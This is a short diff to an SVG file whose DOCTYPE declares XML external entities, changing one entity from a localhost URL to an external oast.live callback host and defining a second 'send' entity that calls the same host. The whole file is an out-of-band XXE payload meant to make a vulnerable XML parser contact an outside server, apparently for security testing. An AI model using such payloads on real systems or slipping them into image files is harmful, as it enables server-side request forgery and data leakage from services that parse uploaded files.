@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY % file SYSTEM "http://127.0.0.1:80/">
+  <!ENTITY % file SYSTEM "https://d7bd1okgtqkkc3i8ij3gs8ghg89xzw7zm.oast.live">
   <!ENTITY % payload "<!ENTITY send SYSTEM 'https://d7bd1okgtqkkc3i8ij3gs8ghg89xzw7zm.oast.live;'>">
   %payload;
 ]>
